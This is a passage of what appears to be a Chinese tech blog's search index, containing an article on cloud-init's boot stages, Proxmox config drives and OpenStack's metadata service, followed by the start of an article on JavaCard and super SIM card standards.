NetworkManager.service</li>\n<li>核心执行代码：<code>/usr/bin/cloud-init init</code></li>\n</ul>\n<p>此阶段运行核心配置文件中名为<code>cloud_init_modules下</code>的所有module，主要包括：</p>\n<ul>\n<li>文件系统配置：包括 disk_setup 、resizefs、growpart 等<br>由于 nfs 等依赖于网络配置，这些模块不能过早启动。</li>\n<li>主机网络配置：包括 set_hostname、update_hostname、update_etc_hosts等</li>\n<li>辅助功能实现：包括 migrator、bootcmd、write-files、rsyslog、user-groups、ssh等</li>\n</ul>\n<h3 id=\"3-Config-Stage\"><a href=\"#3-Config-Stage\" class=\"headerlink\" title=\"3. Config Stage\"></a>3. Config Stage</h3><p>分析 systemd 配置文件<code>cloud-config.service</code>和<code>cloud-config.target</code>，发现：</p>\n<ul>\n<li>依赖于 cloud-init-local.service 和 cloud-init.service</li>\n<li>核心执行代码：<code>/usr/bin/cloud-init modules --mode=config</code></li>\n</ul>\n<p>此阶段运行核心配置文件中名为<code>cloud_config_modules下</code>的所有module，主要包括：</p>\n<ul>\n<li>文件系统挂载：包括 mounts 等</li>\n<li>主机环境配置：包括 locale、timezone、set-password、rh_subscription等</li>\n<li>系统软件处理：包括 yum-add-repo、package-update-upgrade-install</li>\n<li>辅助功能实现：包括 runcmd、puppet等</li>\n</ul>\n<h3 id=\"4-Final-Stage\"><a href=\"#4-Final-Stage\" class=\"headerlink\" title=\"4. Final Stage\"></a>4. Final Stage</h3><p>分析 systemd 配置文件<code>cloud-final.service</code>，发现：</p>\n<ul>\n<li>依赖于 cloud-config.service</li>\n<li>核心执行代码：<code>/usr/bin/cloud-init modules --mode=final</code></li>\n</ul>\n<p>此阶段运行核心配置文件中名为<code>cloud_final_modules下</code>的所有module，主要包括：</p>\n<ul>\n<li>用户脚本处理：包括 scripts-per-once、scripts-per-boot、scripts-per-instance、scripts-user 等</li>\n<li>用户登录配置：包括 ssh-authkey-fingerprints、keys-to-console等</li>\n<li>系统软件处理：包括 yum-add-repo、package-update-upgrade-install</li>\n<li>辅助功能实现：包括 final-message、phone-home等</li>\n</ul>\n<h3 id=\"5-cloud-cfg-示例\"><a href=\"#5-cloud-cfg-示例\" class=\"headerlink\" title=\"5. cloud.cfg 示例\"></a>5. cloud.cfg 示例</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">default</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">disable_root:</span> <span class=\"number\">1</span>                             <span class=\"comment\"># 禁止root登录，默认true，一般需修改！</span></span><br><span class=\"line\"><span class=\"attr\">ssh_pwauth:</span>   <span class=\"number\">0</span>                             <span class=\"comment\"># 允许密码登录，默认false，一般需修改！</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">mount_default_fields:</span> [<span class=\"string\">~</span>, <span class=\"string\">~</span>, <span class=\"string\">&#x27;auto&#x27;</span>, <span class=\"string\">&#x27;defaults,nofail,x-systemd.requires=cloud-init.service&#x27;</span>, <span class=\"string\">&#x27;0&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>]</span><br><span class=\"line\"><span class=\"attr\">resize_rootfs_tmp:</span> <span class=\"string\">/dev</span></span><br><span class=\"line\"><span class=\"attr\">ssh_deletekeys:</span>   <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">ssh_genkeytypes:</span>  <span class=\"string\">~</span></span><br><span class=\"line\"><span class=\"attr\">syslog_fix_perms:</span> <span class=\"string\">~</span></span><br><span class=\"line\"><span class=\"attr\">disable_vmware_customization:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cloud_init_modules:</span>                         <span class=\"comment\"># 定义init阶段需要执行的模块</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">disk_setup</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">migrator</span>                                 <span class=\"comment\"># 迁移老的cloud-init数据</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">bootcmd</span>                                  <span class=\"comment\"># 启动时执行相关命令</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">write-files</span>                              <span class=\"comment\"># 根据cloud.cfg的配置写数据到文件里</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">growpart</span>                                 <span class=\"comment\"># 扩展分区到硬盘的大小 ，默认对根分区执行。需要调用 growpart ！</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">resizefs</span>                                 <span class=\"comment\"># resize文件系统，适配新的大小。默认对根目录执行</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">set_hostname</span>                             <span class=\"comment\"># 根据元数据设置主机名</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">update_hostname</span>                          <span class=\"comment\"># 更新主机名，适用于当用户自定义主机名时</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">update_etc_hosts</span>                         <span class=\"comment\"># 更新 /etc/hosts</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">rsyslog</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">users-groups</span>                             <span class=\"comment\"># 根据cloud.cfg的配置创建用户组和用户</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">ssh</span>                                      <span class=\"comment\"># 配置sshd</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cloud_config_modules:</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">mounts</span>                                   <span class=\"comment\"># 加载自定义的磁盘，/etc/fstab ？</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">locale</span>                                   <span class=\"comment\"># 设置语言</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">set-passwords</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">rh_subscription</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">yum-add-repo</span>                             <span class=\"comment\"># 添加自定义 YUM 源，好像只能加1个？</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">package-update-upgrade-install</span>           <span class=\"comment\"># 安装完成后自动升级软件包，一般需关闭！</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">timezone</span>                                 <span class=\"comment\"># 设置时区</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">puppet</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">chef</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">salt-minion</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">mcollective</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">disable-ec2-metadata</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">runcmd</span>                                   <span class=\"comment\"># 执行自定义的命令行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">cloud_final_modules:</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">rightscale_userdata</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-per-once</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-per-boot</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-per-instance</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">scripts-user</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">ssh-authkey-fingerprints</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">keys-to-console</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">phone-home</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">final-message</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">power-state-change</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">system_info:</span></span><br><span class=\"line\">  <span class=\"attr\">default_user:</span>                             <span class=\"comment\"># 自动创建默认用户，可修改！</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">centos</span></span><br><span class=\"line\">    <span class=\"attr\">lock_passwd:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"attr\">gecos:</span> <span class=\"string\">Cloud</span> <span class=\"string\">User</span></span><br><span class=\"line\">    <span class=\"attr\">groups:</span> [<span class=\"string\">adm</span>, <span class=\"string\">systemd-journal</span>]</span><br><span class=\"line\">    <span class=\"attr\">sudo:</span> [<span class=\"string\">&quot;ALL=(ALL) NOPASSWD:ALL&quot;</span>]</span><br><span class=\"line\">    <span class=\"attr\">shell:</span> <span class=\"string\">/bin/bash</span></span><br><span class=\"line\">  <span class=\"attr\">distro:</span> <span class=\"string\">rhel</span>                              <span class=\"comment\"># Linux发行版类型是 redhat</span></span><br><span class=\"line\">  <span class=\"attr\">paths:</span></span><br><span class=\"line\">    <span class=\"attr\">cloud_dir:</span> <span class=\"string\">/var/lib/cloud</span>               <span class=\"comment\"># 缓存数据目录</span></span><br><span class=\"line\">    <span class=\"attr\">templates_dir:</span> <span class=\"string\">/etc/cloud/templates</span>     <span class=\"comment\"># 模版文件目录</span></span><br><span class=\"line\">  <span class=\"attr\">ssh_svcname:</span> <span class=\"string\">sshd</span></span><br></pre></td></tr></table></figure>\n\n<p>官方文档提供了配置文件的自定义规则方法，参见<a href=\"https://cloudinit.readthedocs.io/en/latest/reference/examples.html\">Cloud config examples</a></p>\n<h2 id=\"三、PVE-的-config-drive-实现\"><a href=\"#三、PVE-的-config-drive-实现\" class=\"headerlink\" title=\"三、PVE 的 config drive 实现\"></a>三、PVE 的 config drive 实现</h2><p>Config drive 机制是将 metadata 信息写入虚拟机的一个特殊的配置设备（例如 CDROM ）中，然后在虚拟机启动时，自动挂载并读取 metadata 信息，从而达到获取 metadata 的目的。</p>\n<blockquote>\n<p>光盘作为存储介质，也需要安装特定的文件系统来管理数据和文件，这就是 <a href=\"https://www.iso.org/obp/ui/#iso:std:iso:9660:ed-1:v1:en\">ISO 9660</a>，别名是 CDFS</p>\n</blockquote>\n<p>PVE 的虚拟机模版通过增加一个专用的 Cloud-init CDROM 设备实现 config drive。</p>\n<p>例如，我们从前台界面配置了 一个虚拟机 VM 511。<br><img src=\"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/pve-cloudinit.png\" alt=\"PVE\"></p>\n<p>第一步，将配置信息存储在<code>/etc/pve/qemu-server/511.conf</code>，内容是：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">agent:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">bootdisk:</span> <span class=\"string\">scsi0</span></span><br><span class=\"line\"><span class=\"attr\">cores:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">ide2:</span> <span class=\"string\">local-lvm:vm-511-cloudinit,media=cdrom</span></span><br><span class=\"line\"><span class=\"attr\">ipconfig0:</span> <span class=\"string\">ip=192.168.0.223/24,gw=192.168.0.8</span></span><br><span class=\"line\"><span class=\"attr\">memory:</span> <span class=\"number\">1024</span></span><br><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">cloud-init</span></span><br><span class=\"line\"><span class=\"attr\">nameserver:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.144</span></span><br><span class=\"line\"><span class=\"attr\">net0:</span> <span class=\"string\">virtio=DA:41:A4:42:9C:DB,bridge=vmbr0,firewall=1</span></span><br><span class=\"line\"><span class=\"attr\">numa:</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attr\">ostype:</span> <span class=\"string\">l26</span></span><br><span class=\"line\"><span class=\"attr\">scsi0:</span> <span class=\"string\">local-lvm:vm-511-disk-0,size=10G</span></span><br><span class=\"line\"><span class=\"attr\">scsihw:</span> <span class=\"string\">virtio-scsi-pci</span></span><br><span class=\"line\"><span class=\"attr\">searchdomain:</span> <span class=\"string\">caogo.local3</span></span><br><span class=\"line\"><span class=\"attr\">smbios1:</span> <span class=\"string\">uuid=5584c7ed-76f4-4b6d-a6fe-cb10a8b220fc</span></span><br><span class=\"line\"><span class=\"attr\">sockets:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">vmgenid:</span> <span class=\"string\">297abc09-fa0f-46b0-b9ad-ae3195110f2a</span></span><br></pre></td></tr></table></figure>\n\n<p>第二步，PVE 控制台将 VM 相关的 metadata 信息写入 libvirt 的虚拟磁盘文件中，并指示 libvirt 将其虚拟为 cdrom 设备。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/dev/pve# ls -l /dev/pve/vm-511-cloudinit</span><br><span class=\"line\">lrwxrwxrwx 1 root root 8 Sep 17 23:11 /dev/pve/vm-511-cloudinit -&gt; ../dm-24</span><br></pre></td></tr></table></figure>\n\n<p>这样，当该虚拟机启动时，Guest 操作系统中的 cloud-init 会去挂载该 cloud-init 设备，然后根据所读取出的内容对虚拟机进行配置。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@copy-of-vm-centos7 ~]# mount /dev/sr0 /mnt</span><br><span class=\"line\">mount: /dev/sr0 写保护，将以只读方式挂载</span><br><span class=\"line\">[root@copy-of-vm-centos7 ~]# ls -l /mnt</span><br><span class=\"line\">总用量 2</span><br><span class=\"line\">-rw-r--r--. 1 root root  54 9月  17 12:08 meta-data</span><br><span class=\"line\">-rw-r--r--. 1 root root 227 9月  17 12:08 network-config</span><br><span class=\"line\">-rw-r--r--. 1 root root 170 9月  17 12:08 user-data</span><br></pre></td></tr></table></figure>\n\n<p>第三步，虚拟机启动 cloud-init 时，将读取<code>/dev/sr0</code>的全部文件并加载到缓存。</p>\n<p>cloud-init 支持四种配置文件，其中：</p>\n<ul>\n<li><code>meta-data</code>（必须）: 一般是 instance id，唯一的一个机器标识符</li>\n<li><code>network-config</code>: 关于网络如 ip、nameserver、dns等的定义</li>\n<li><code>user-data</code>（可选）: 我们定义的大多数配置都放在这里</li>\n<li><code>vendor-data</code>（可选）: 是供应商（云）定义的如 user-data 类似数据，如果定义为 NoCloud 时该文件不存在</li>\n</ul>\n<h3 id=\"元数据配置文件：meta-data\"><a href=\"#元数据配置文件：meta-data\" class=\"headerlink\" title=\"元数据配置文件：meta-data\"></a>元数据配置文件：meta-data</h3><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义了一个实例instance，并设置了唯一ID</span></span><br><span class=\"line\"><span class=\"attr\">instance-id:</span> <span class=\"string\">5be815eb6375dae4bfdd91471def3f8415521f1d</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"网络配置文件：network-config\"><a href=\"#网络配置文件：network-config\" class=\"headerlink\" title=\"网络配置文件：network-config\"></a>网络配置文件：network-config</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">config:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">physical</span></span><br><span class=\"line\">      <span class=\"attr\">name:</span> <span class=\"string\">eth0</span></span><br><span class=\"line\">      <span class=\"attr\">mac_address:</span> <span class=\"string\">&#x27;da:41:a4:42:9c:db&#x27;</span></span><br><span class=\"line\">      <span class=\"attr\">subnets:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">static</span></span><br><span class=\"line\">        <span class=\"attr\">address:</span> <span class=\"string\">&#x27;192.168.0.223&#x27;</span></span><br><span class=\"line\">        <span class=\"attr\">netmask:</span> <span class=\"string\">&#x27;255.255.255.0&#x27;</span></span><br><span class=\"line\">        <span class=\"attr\">gateway:</span> <span class=\"string\">&#x27;192.168.0.8&#x27;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">nameserver</span></span><br><span class=\"line\">      <span class=\"attr\">address:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&#x27;192.168.0.144&#x27;</span></span><br><span class=\"line\">      <span class=\"attr\">search:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&#x27;caogo.local3&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户数据文件：user-data\"><a href=\"#用户数据文件：user-data\" class=\"headerlink\" title=\"用户数据文件：user-data\"></a>用户数据文件：user-data</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义了大多数配置信息</span></span><br><span class=\"line\"><span class=\"attr\">hostname:</span> <span class=\"string\">cloud-init</span></span><br><span class=\"line\"><span class=\"attr\">manage_etc_hosts:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 完全合格域名 FQDN (Fully Qualified Domain Name)是一个包含了主机名和域名的完整标识符</span></span><br><span class=\"line\"><span class=\"attr\">fqdn:</span> <span class=\"string\">cloud-init.caogo.local3</span></span><br><span class=\"line\"><span class=\"attr\">chpasswd:</span></span><br><span class=\"line\">  <span class=\"attr\">expire:</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">package_upgrade:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、openStack-的-Metadata-RESTful-服务机制\"><a href=\"#四、openStack-的-Metadata-RESTful-服务机制\" class=\"headerlink\" title=\"四、openStack 的 Metadata RESTful 服务机制\"></a>四、openStack 的 Metadata RESTful 服务机制</h2><p>OpenStack 提供了 RESTful 接口，虚拟机可以通过 REST API 来获取 metadata 信息，具体包含了三个服务组件，其中<code>Nova-api-metadata</code>运行在云平台的控制节点，<code>neutron-metadata-agent</code>和<code>Neutron-ns-metadata-proxy</code>运行在网络节点，分别位于 openstack 管理网络和 租户所在的用户网络。</p>\n<p><img src=\"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/nova.jpg\" alt=\"nova\"></p>\n<p>首先要解决一个问题，在虚拟机尚未配置网络的情况下，往哪里发送 REST API 请求呢？<br>最早由亚马逊公司提出了 metadata 方案，利用 IPv4 保留的本地链路地址段，规定服务地址为 <code>169.254.169.254:80</code>，后来 OpenStack 沿用了这一规定。</p>\n<blockquote>\n<p>Link Local Address 遵循<a href=\"https://datatracker.ietf.org/doc/html/rfc3927\">RFC 3927标准</a>，地址范围是：169.254.0.0&#x2F;16</p>\n</blockquote>\n<p>在具体实现上，Neutron 有两种方式：</p>\n<ul>\n<li>通过 router 发送请求<br>如果虚拟机所在 subnet 连接在了 router 上，那么发向 169.254.169.254 的报文会被发至 router，而 neutron-ns-metadata-proxy 就监听着该端口</li>\n<li>通过 DHCP 发送请求<br>通过 DHCP 协议的选项 121 来为虚拟机设置静态路由，此时虚拟机所在 subnet 不需连接任何 router。此方式更为常见！！！</li>\n</ul>\n<p>虚拟机获取 metadata 的大致流程为：<br><img src=\"/2023/09/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6cloud-init%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/workflow.png\" alt=\"workflow\"></p>\n<ol>\n<li>首先，请求被发送至<code>neutron-ns-metadata-proxy</code>，此时会在请求中添加<code>X-Neutron-Router-ID</code>和<code>X-Neutron-Network-ID</code>信息。</li>\n<li>该请求通过 unix domian socket 被转发给 <code>neutron-metadata-agent</code>。</li>\n<li><code>neutron-metadata-agent</code>根据请求中的 router-id、network-id 和 IP，获取 port 信息，从而拿到 instance-id 和 tenant-id 加入请求中。</li>\n<li>请求被转发给<code>nova-api-metadata</code>。</li>\n<li><code>nova-api-metadata</code>其利用 instance-id 和 tenant-id 获取虚拟机的 metadata，返回相应的结果信息。</li>\n</ol>\n<p>注意！为了解决网络节点的网段和租户的虚拟网段重复的问题，OpenStack 引入了网络命名空间，Neutron 中的路由和 DHCP 服务器都在各自独立的命名空间中。由于虚拟机获取 metadata 的请求都是以路由和 DHCP 服务器作为网络出口，所以需要通过 neutron-ns-metadata-proxy 利用基于 unix domain socket 的 HTTP 技术打通不同的网络命名空间，将请求在网络命名空间之间转发。</p>\n<h2 id=\"五、疑难杂症\"><a href=\"#五、疑难杂症\" class=\"headerlink\" title=\"五、疑难杂症\"></a>五、疑难杂症</h2><h3 id=\"1-cloud-init-与-NetworkManager-的关系\"><a href=\"#1-cloud-init-与-NetworkManager-的关系\" class=\"headerlink\" title=\"1. cloud-init 与 NetworkManager 的关系\"></a>1. cloud-init 与 NetworkManager 的关系</h3><p>通过源代码分析，在 Local Stage 从 datasource 里读取网络配置信息，处理逻辑是：</p>\n<ul>\n<li>如果发现使用的是静态地址，cloud-init 就会将 datasource 定义的配置信息写入<code>/etc/network/interfaces</code>目录下的配置文件</li>\n<li>如果发现使用的是 DHCP，cloud-init 并不会创建刷新网卡配置文件，配置ip的工作就交由 NetworkManager 自动获取</li>\n</ul>\n<p>从以信息可知，如果创建静态ip的虚拟机，NetworkManager 这个服务必须在 cloudinit-local 之后启动才可正常从配置文件中读取 ip 并配置。而当你在镜像里安装 NetworkManager后，默认情况下它的启动顺序是会在 cloudinit-local 之前的。</p>\n<h3 id=\"2-openEuler-的网卡名称被修改\"><a href=\"#2-openEuler-的网卡名称被修改\" class=\"headerlink\" title=\"2. openEuler 的网卡名称被修改\"></a>2. openEuler 的网卡名称被修改</h3><p>openEuler 初始化安装时，NetworkManager 采用的是 net.ifnames 命名规范，初始网卡被命名为<code>ens18</code>。<br>安装 cloud-init 之后，其强制改为 biosdevname 命名规范，因此默认网卡被改名为<code>eth0</code>。<br>注意，老的网卡配置文件依然存在！具体实现原理参见<a href=\"http://pythontime.iswbm.com/en/latest/c08/c08_06.html#centos-6-x\">CentOS 6.x 如何更改网卡名</a></p>\n<h3 id=\"3-BCLinux-oe21-10-安装-cloud-init-后启动失败，提示错误信息hosts-redhat文件不存在\"><a href=\"#3-BCLinux-oe21-10-安装-cloud-init-后启动失败，提示错误信息hosts-redhat文件不存在\" class=\"headerlink\" title=\"3. BCLinux oe21.10 安装 cloud-init 后启动失败，提示错误信息hosts.redhat文件不存在\"></a>3. BCLinux oe21.10 安装 cloud-init 后启动失败，提示错误信息<code>hosts.redhat</code>文件不存在</h3><p>BCLinux oe21.10 提供的 cloud-init 版本，并未建立模版目录<code>/etc/cloud/templates</code>，也找不到<code>hosts.redhat.tmpl</code>文件。<br>根本原因是 cloud-init 目前适配了 Centos 和 openEuler 等主流版本，配置信息在 distor 中，但 BCLinux 不再其中。<br>临时解决办法是，手工建模版目录，并拷贝相应的模版文件，凑合着使吧！！！</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://pythontime.iswbm.com/en/latest/c08/c08_06.html#\">cloud-init 源码解读</a></li>\n<li><a href=\"https://xixiliguo.github.io/linux/cloud-init.html\">cloud-init 介绍</a></li>\n<li><a href=\"https://einverne.github.io/post/2020/03/cloud-init.html\">Cloud-init 初始化虚拟机配置</a></li>\n<li><a href=\"https://gameapp.club/post/2022-07-30-custom-cloud-init-for-pve/\">基于 Cloud-init 定制化 PVE 虚拟机</a></li>\n<li><a href=\"https://www.cnblogs.com/gushiren/p/9511234.html\">cloud-init简介及组件说明</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/55078689\">深度解析 OpenStack metadata 服务架构</a></li>\n<li><a href=\"https://www.jianshu.com/p/cd8f60e30034\">OpenStack 的 metadata 服务机制</a></li>\n<li><a href=\"https://developer.aliyun.com/article/311493\">Metadata Service 架构详解</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/38774639\">OpenStack虚拟机如何获取metadata</a></li>\n</ul>\n"},{"title":"超级SIM卡的技术标准分析","url":"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/","content":"<p>随着IC卡从简单的同步卡发展到异步卡，从简单的EPROM卡发展到内带微处理器的智能卡(又称CPU卡)，对IC卡的各种要求越来越高。而卡本身所需要的各种管理工作也越来越复杂，因此就迫切地需要有一种工具来解决这一矛盾，而内部带有微处理器的智能卡的出现，使得这种工具的实现变成了现实。</p>\n<p>Chip Operating System（片内操作系统，简称COS），就是基于智能卡内置的微处理器芯片的操作系统。COS的出现不仅大大地改善了智能卡的交互界面，使智能卡的管理变得容易；而且，更为重要的是使智能卡本身向着个人计算机化的方向迈出了一大步，为智能卡的发展开拓了极为广阔的前景。</p>\n<p>在这一领域处于领导地位的有三项主导技术：<code>Java Card</code>、<code>Windows Powered Smart Cards</code>以及<code>MULTOS</code>，但从发展情况看，JavaCard已经成为事实上的行业标准。</p>\n<p>与Windows、Unix等通用操作系统不同，COS所需要解决的主要还是对外部的命令如何进行处理、响应的问题，这其中一般并不涉及到共享、并发的管理及处理，而且就智能卡在应用情况而看，并发和共享的工作也确实是不需要的；此外，由于 COS 不可避免地受到了智能卡内微处理器芯片的性能及内存容量的影响，系统设计时一般都是紧密结合智能卡内存储器分区的情况，按照国际标准（ISO&#x2F;IEC7816系列标准）中所规定的一些功能进行裁剪或自定义扩充，因此COS很大程度上是一个专用系统而不是通用操作系统。</p>\n<h2 id=\"JavaCard\"><a href=\"#JavaCard\" class=\"headerlink\" title=\"JavaCard\"></a>JavaCard</h2><h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>多年以前，Sun Microsystem 就非常重视智能卡的市场空间，对 Java技术规范进行了大量裁剪和简化，为智能卡提供了 JavaCard平台，主要目的是在智能卡或与智能卡相近的设备上，以具有安全防护性的方式来运行小型的Java Applet。</p>\n<p>JavaCard就是在智能卡ROM中实现了一个Java虚拟机（Java Virtual Machine 简称JVM），该 JVM将执行一个Java字节码的子集，提供外部可以访问的功能，负责控制对智能卡资源的访问(如内存和I&#x2F;O)。Javacard用于使用Java编程语言以及JVM和Java库的有限版本，用于编写智能卡平台的应用程序-javacard applet。</p>\n<p>Java Card虚拟机（Java Card Virtual Machine，也可简称为Java Card VM或JCVM），是原有Java虚拟机的子集合，负责对Java Applet进行程序直译、运行及结果回应，也因此JCVM的空间占量不能太大，必须能小到放入智能卡内。</p>\n<h3 id=\"基础架构\"><a href=\"#基础架构\" class=\"headerlink\" title=\"基础架构\"></a>基础架构</h3><img src=\"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/javacard.png\" class=\"\">\n\n<p>一台典型的 JavaCard 设备有一个运行于 3.7MHz的8位或16位CPU，带有 1K的RAM和多于 16K的非易失内存（EEPROM或闪存）。高性能的智能卡带有单独的处理器、加密芯片和内存加密，某些智能卡还带有32位CPU。</p>\n<p>既然有容量取向的要求，那也就必须对Java的功效机能进行部分权衡取舍，即便可以用多种方式让应用程序的体积占量突破容量限制，例如将应用程序的代码划分到Package（Java编程语言中，用来将类以性质、用途等不同取向等而集中放置的地方，即称为Package）内，但是每个Package也被限制不能超过64KB的容量。</p>\n<p>由于Java Card的应用程序是在Java Card VM具隔离性的环境下运行，所以程序对卡片资料的写入、读取、修改也受到权限机制的控制保护，无论使用何种读卡设备、操作系统、应用程序都不能跨越权限去访问不属于自己的卡片内资料，等于具有小型应用程序的防火墙的功效。 无论是电信方面还是金融方面的智能片应用，现在都运用Java Card技术来防护卡内所存储的信息资料。</p>\n<p>与以前的智能卡技术相比，采用JavaCard技术的智能卡可以采用 Java进行编程，因此具有高度的可移植性和安全性，更为重要的是，在卡被发送到用户以后，应用程序还可以被动安全地下载到卡中，从而动态地扩展了智能卡的功能。</p>\n<h3 id=\"技术组件\"><a href=\"#技术组件\" class=\"headerlink\" title=\"技术组件\"></a>技术组件</h3><p>JavaCard提供了 JavaCard字节码验证方案，并支持代码签名的安全模型，这意味着在使用由<code>OpenPlatform</code>规定的安全下载应用过程下载应用程序之前，必须先将程序代码经过安全的转换 、评估和签名。</p>\n<p>Java Card技术规范的最新版本为<code>3.1</code>, 但目前应用最广泛的是版本<code>2.2</code>，由三部分组成：</p>\n<ul>\n<li>Java Card 虚拟机规范，定义了用于智能卡的 Java 程序编程语言的一个子集和虚拟机。</li>\n<li>Java Card 运行时环境规范，详细定义了基于 Java 的智能卡的运行时行为。</li>\n<li>Java Card API 规范，定义了用于智能卡应用程序的核心框架和扩展 Java 软件包和类。</li>\n</ul>\n<p>Sun 还提供了 Java Card 开发工具（JCDK），其中包括 Java Card RE 和 Java Card VM 的参考实现以及其他帮助开发的 Java Card applet 。</p>\n<h2 id=\"GlobalPlatform\"><a href=\"#GlobalPlatform\" class=\"headerlink\" 